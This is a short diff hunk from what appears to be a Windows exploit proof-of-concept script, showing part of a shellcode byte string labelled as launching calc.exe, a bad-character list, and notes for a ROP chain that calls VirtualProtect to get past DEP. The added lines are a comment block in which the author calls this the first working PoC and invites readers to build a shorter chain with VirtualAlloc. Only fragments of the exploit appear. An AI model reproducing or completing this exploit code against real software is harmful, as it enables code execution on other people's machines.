@@ -36,8 +36,17 @@ shellcode += b"\x7f\x0f\x20\xac\x1e\x83\xa8\x1d\x85\x23\x4a\x62"
 # shellcode --> calc.exe
 # bad characters: \x00\x0a\x0d
 
+#------------------------------------------------#
+# The following ROP Chain is a very long one.				#
+# I'm sure there's a way to develop a shorter				#
+# rop, but I just uploaded the first working poc	#
+# I developed... Why don't you try to implement		#
+# a shorter chain with VirtualAlloc?? I am sure		#
+# it's possible!!																																#
+#------------------------------------------------#
+
 '''
-ROP CHAIN:
+ROP CHAIN with VirtualProtect
 
  EAX = ptr to &VirtualProtect()
  ECX = lpOldProtect (ptr to W address)
